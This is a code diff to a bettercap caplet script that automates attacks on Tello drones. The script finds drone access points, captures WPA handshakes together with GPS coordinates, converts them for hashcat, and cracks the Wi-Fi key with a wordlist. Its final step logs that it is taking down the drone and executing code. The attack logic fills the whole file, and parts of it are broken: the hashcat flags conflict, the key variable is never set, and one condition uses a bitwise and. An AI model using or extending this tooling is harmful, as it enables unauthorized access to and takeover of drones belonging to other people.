@@ -1,4 +1,4 @@
-include("config");
+require("config");
 
 var target; // Target ap (drone) bssid
 
@@ -47,7 +47,7 @@ onEvent('mod.started', function(event){
 onEvent('wifi.ap.new', function(event){
     var ap = event.data;
     log('📡 Access point detected: ' + ap.hostname + ' @ ' + ap.mac + ' (' + ap.vendor + ')');
-    //log(JSON.stringify(ap));
+    log_debug(JSON.stringify(ap));
     if(ap.hostname.startsWith('TELLO-')){
         log('🚁 Drone identified, homing in on channel ' + ap.channel);
         run('wifi.recon.channel ' + ap.channel);
@@ -74,30 +74,35 @@ onEvent('wifi.client.handshake', function(event){
     }
 
     log('💰 Captured ' + what + ':');
-    log(' station: ' + data.station);
-    log(' ap: ' + data.ap);
-    log(' lat:' + gps.Latitude + ' lon:' + gps.Longitude + ' updated_at:' + gps.Updated.String());
+    log('   station: ' + data.station);
+    log('   ap: ' + data.ap);
+    log('   lat:' + gps.Latitude + ' lon:' + gps.Longitude + ' updated_at:' + gps.Updated.String());
 
     if(data.full & target == data.ap) { //TODO: check this
         log('📝 Target handshake data aquired, stopping wifi recon');
         run('wifi.recon off'); // Stop wifi recon 
 
         log('🪄 Converting packets to 22000 format');
-        cmd = hcxpcapngtool;
-        cmd += ' -o ' + hashcatFormat22000FileName;
-        cmd += //TODO: filter on ap mac address
-        cmd += ' ' + handshakesFileName;
+        var cmd = hcxpcapngtool +
+            ' -o ' + hashcatFormat22000FileName +
+            //TODO: filter on ap mac address +
+            ' ' + handshakesFileName;
+        log_debug('Command: ' + cmd);
         run('!'+cmd);
 
-        log('🪅 Cracking hashes');
-        cmd = 'cd ' + hashcatHomePath;
-        cmd += ' && ' + hashcat;
-        cmd += ' -m 3 -a 3 -m 22000 -w' + wordlistFileName;
-        cmd += ' -o ' + hashcatOutputFileName;
-        cmd += ' ' + hashcatFormat22000FileName;
+        log('🪅 Cracking hashes, stand by...');
+        var cmd = 'cd ' + hashcatHomePath +
+            ' && ' + hashcat +
+            ' -m 3 -a 3 -m 22000 -w' + wordlistFileName +
+            ' -o ' + hashcatOutputFileName +
+            ' ' + hashcatFormat22000FileName;
+        log_debug('Command: ' + cmd);
+        run('!'+cmd);
 
-        log('🔑 Found');
+        var key;
 
-        log('💎 Logging into 🚁, and executing code');
+        log('🔑 Found: '+ key);
+
+        log('💎 Taking down 🚁 and executing code');
     }
 });
